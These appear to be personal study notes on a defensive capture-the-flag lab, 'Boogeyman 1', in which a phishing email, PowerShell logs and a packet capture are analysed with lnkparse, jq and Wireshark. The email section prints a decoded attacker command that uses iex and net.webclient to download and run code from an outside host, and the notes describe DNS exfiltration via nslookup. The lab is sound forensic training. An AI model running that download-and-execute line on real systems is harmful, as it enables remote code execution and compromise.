---
title: Boogeyman 1
updated: 2026-04-25 17:20:09Z
created: 2026-04-23 15:32:01Z
latitude: 18.67958480
longitude: 105.68133330
altitude: 0.0000
---

## Artefacts

For the investigation proper, you will be provided with the following artefacts:

- Copy of the phishing email (dump.eml)
- Powershell Logs from Julianne's workstation (powershell.json)
- Packet capture from the same workstation (capture.pcapng)

# Scenario

Julianne, a finance employee working for Quick Logistics LLC, received a follow-up email regarding an unpaid invoice from their business partner, B Packaging Inc. Unbeknownst to her, the attached document was malicious and compromised her workstation.

![fa61948c65a32016d95cba8f1f705114.png](../../../_resources/fa61948c65a32016d95cba8f1f705114.png)

# Email Analysis

There are 2 ways to analyse the headers and rebuild the attachment:

1.  uses command-line tools such as **cat**, **grep**, **base64**, and **sed.** Analyse the contents manually and build the attachment by decoding the string located at the bottom of the file.
    - ![22800a6d809c70034ccfac04c3346b89.png](../../../_resources/22800a6d809c70034ccfac04c3346b89.png)
2.  double-click the EML file to open it via Thunderbird. The attachment can be saved and extracted accordingly.

Once the payload from the encrypted archive is extracted, use **lnkparse** to extract the information inside the payload.

![07dd91f5a307d6095db64fad317da5f3.png](../../../_resources/07dd91f5a307d6095db64fad317da5f3.png)

## Practice

![e2b7dabae3c493d0ae6b0a893fd499f9.png](../../../_resources/e2b7dabae3c493d0ae6b0a893fd499f9.png)

using command: `lnkparse Invoice_20230103.lnk`

I notice the both lines **Relative path** and **Command line arguments**, proving that this file will create an powershell process and run the command above.

![5bbd1fcd4df38fadbad0d47a31c1e37f.png](../../../_resources/5bbd1fcd4df38fadbad0d47a31c1e37f.png)

After decode the encoded string, It seems like a command that create a socket object to download a malicious file from attacker's webserver.

- `iex` stands for "Invoke-Expression," which executes the string passed to it as PowerShell code.
- `new-object net.webclient` creates a web client object to download content from the internet.
- `.downloadstring('http://files.bpakcaging.xyz/update')` fetches the content of the specified URL as a string.
- The entire command downloads and executes the content from `http://files.bpakcaging.xyz/update` in the user's PowerShell environment.

# Endpoint Security

Based on the initial findings, we discovered how the malicious attachment compromised Julianne's workstation:

- A PowerShell command was executed.
- Decoding the payload reveals the starting point of endpoint activities.

Now, we should proceed with analysing the PowerShell logs to uncover the potential impact of the attack.

## JQ Cheatsheet

jq is a **lightweight** and **flexible** command-line **JSON** processor

|     |     |
| --- | --- |
| Parse all JSON into beautified output | `cat powershell.json \| jq` |
| Print all values from a specific field without printing the field | `cat powershell.json \| jq '.Field1'` |
| Print all values from a specific field | `cat powershell.json \| jq '{Field1}'` |
| Print values from multiple fields | `cat powershell.json \| jq '{Field1, Field2}'` |
| Sort logs based on their Timestamp | `cat powershell.json \| jq -s -c 'sort_by(.Timestamp) \| .[]'` |
| Sort logs based on their Timestamp and print multiple field values | `cat powershell.json \| jq -s -c 'sort_by(.Timestamp) \| .[] \| {Field}'` |

## Practice

![3cfdbc42d582e9723514a03714134273.png](../../../_resources/3cfdbc42d582e9723514a03714134273.png)

using command: `jq -r '[.. | strings | scan("(?i)(?:[a-zA-Z0-9.-]{0,61}[a-zA-Z0-9])?\\.)+(?:[a-z]{2,})") powershell.json | grep 'Seatbelt'`

![ec646b8e11a02868d57572b6c2a92fc9.png](../../../_resources/ec646b8e11a02868d57572b6c2a92fc9.png)

using command: `cat powershell.json | jq -s -c 'sort_by(.Timestamp) | .[]' | jq '{ScriptBlockText}' | sort -u | grep -e "sq3.exe" -e "cd"`

![3f0a6c07a79172ae2fd653cc7952eb8d.png](../../../_resources/3f0a6c07a79172ae2fd653cc7952eb8d.png)

using command: `cat powershell.json | jq -s -c 'sort_by(.Timestamp) | .[]'| jq '{ScriptBlockText}' | sort -u`

![c46fae297c90cdbbdbc9adb27e535e8e.png](../../../_resources/c46fae297c90cdbbdbc9adb27e535e8e.png)

<img src="../../../_resources/37d28c3a5c1d3a4b12b7585107227e02.png" alt="37d28c3a5c1d3a4b12b7585107227e02.png" width="555" height="554" class="jop-noMdConv">

# Network Traffic Analysis

Based on the PowerShell logs investigation, we have seen the full impact of the attack:

- The threat actor was able to read and exfiltrate two potentially sensitive files.
- The domains and ports used for the network activity were discovered, including the tool used by the threat actor for exfiltration.

Finally, we can complete the investigation by understanding the network traffic caused by the attack:

- Utilise the domains and ports discovered from the previous task.
- All commands executed by the attacker and all command outputs were logged and stored in the packet capture.
- Follow the streams of the notable commands discovered from PowerShell logs.
- Based on the PowerShell logs, we can retrieve the contents of the exfiltrated data by understanding how it was encoded and extracted.

![6e27ac8dc8319b73394545f1a8b54112.png](../../../_resources/6e27ac8dc8319b73394545f1a8b54112.png)

![ec0c8a6c32087795d95898401cc37a5d.png](../../../_resources/ec0c8a6c32087795d95898401cc37a5d.png)

**What is the protocol used during the exfiltration activity?**

in the previous task, we've known that the attacker using **nslookup** tool to search domains, so that the protocol used by attacker should be **DNS**

**What is the protocol used during the exfiltration activity?**

**![f00abbdbf8083d74ce10b4ff2d608c22.png](../../../_resources/f00abbdbf8083d74ce10b4ff2d608c22.png)**

**![a306f5b45b1b8c3118da2f5c56c55d49.png](../../../_resources/a306f5b45b1b8c3118da2f5c56c55d49.png)**

**![1da0d1e4fbf81860c39236e424e94020.png](../../../_resources/1da0d1e4fbf81860c39236e424e94020.png)**

**![1c74d4283b1027b60a0844ecbe94034b.png](../../../_resources/1c74d4283b1027b60a0844ecbe94034b.png)**

**![fda49a5ef15d02b121495fbfea06fa4e.png](../../../_resources/fda49a5ef15d02b121495fbfea06fa4e.png)**